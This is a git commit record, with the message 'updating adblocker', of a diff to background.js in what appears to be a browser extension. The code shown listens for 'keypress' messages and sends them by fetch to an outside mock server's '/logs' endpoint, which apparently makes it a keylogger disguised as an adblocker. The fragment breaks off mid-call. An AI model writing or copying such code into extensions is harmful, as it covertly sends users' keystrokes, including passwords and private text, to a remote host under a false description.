8ce0543dc59176653590bc93b333e20bab2c79ab
0xh7ml <darkhtml2275@gmail.com>
2023-06-04 20:52:27 +0600

    updating adblocker

--- background.js
+++ background.js
@@ -1,4 +1,4 @@
-chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
+chrome.runtime.onMessage.addListener(function (request) {
   if (request.type === 'keypress') {
     // Send the request to the mock server
     fetch('https://ac0191bc-ecd0-40d1-9b4d-efac694665f4.mock.pstmn.io/logs', {
